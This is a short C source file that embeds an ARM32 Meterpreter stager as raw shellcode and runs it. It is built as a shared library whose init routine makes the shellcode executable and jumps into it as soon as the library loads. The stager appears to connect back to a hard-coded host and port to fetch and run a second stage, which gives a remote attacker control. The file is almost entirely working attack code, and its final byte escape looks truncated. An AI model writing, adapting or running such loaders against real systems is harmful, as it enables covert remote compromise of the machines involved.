/* based on x86_shellcode_tester.c by Travis Phillips */
/* https://www.secureideas.com/blog/2021/09/linux-x86-assembly-how-to-test-custom-shellcode-using-a-c-payload-tester.html */

/*	gcc -c -Wall -Werror -fpic execute_inline_shellcode.c 
	gcc -shared -Wl,-init,main -o execute_inline_shellcode.so execute_inline_shellcode.o
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

/* arm32 meterpreter stager */
char payload[] = "\xf0\x70\x9f\xe5\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0\xe3\x00\x00\x00\xef\x00\x00\x50\xe3\x31\x00\x00\xba\x00\xc0\xa0\xe1\x02\x70\x87\xe2\xc4\x10\x8f\xe2\x10\x20\xa0\xe3\x00\x00\x00\xef\x00\x00\x50\xe3\x2a\x00\x00\xba\x0c\x00\xa0\xe1\x04\xd0\x4d\xe2\x08\x70\x87\xe2\x0d\x10\xa0\xe1\x04\x20\xa0\xe3\x00\x30\xa0\xe3\x00\x00\x00\xef\x00\x00\x50\xe3\x21\x00\x00\xba\x00\x10\x9d\xe5\x94\x30\x9f\xe5\x03\x10\x01\xe0\x01\x20\xa0\xe3\x02\x26\xa0\xe1\x02\x10\x81\xe0\xc0\x70\xa0\xe3\x00\x00\xe0\xe3\x07\x20\xa0\xe3\x78\x30\x9f\xe5\x00\x40\xa0\xe1\x00\x50\xa0\xe3\x00\x00\x00\xef\x01\x00\x70\xe3\x12\x00\x00\x0a\x63\x70\x87\xe2\x00\x10\xa0\xe1\x0c\x00\xa0\xe1\x00\x30\xa0\xe3\x00\x20\x9d\xe5\xfa\x2f\x42\xe2\x00\x20\x8d\xe5\x00\x00\x52\xe3\x04\x00\x00\xda\xfa\x2f\xa0\xe3\x00\x00\x00\xef\x00\x00\x50\xe3\x05\x00\x00\xba\xf5\xff\xff\xea\xfa\x2f\x82\xe2\x00\x00\x00\xef\x00\x00\x50\xe3\x00\x00\x00\xba\x01\xf0\xa0\xe1\x01\x70\xa0\xe3\x01\x00\xa0\xe3\x00\x00\x00\xef\x02\x00\x2c\xb3\xc0\xa8\x00\x2d\x19\x01\x00\x00\x00\xf0\xff\xff\x22\x10\x00\x0";

int main()
{
    // Create a function pointer to the shellcode
    void (*payload_ptr)() =  (void(*)())&payload;
 
    // Calculate the address to the start of the page for the shellcode.
    void *page_offset = (void *)((int)payload_ptr & ~(getpagesize()-1));
 
    // Use mprotect to mark that page as RX.
    mprotect(page_offset, 4096, PROT_READ|PROT_EXEC);

    // Finally, use our function pointer to jump into our payload.
    payload_ptr();

    return 0;
}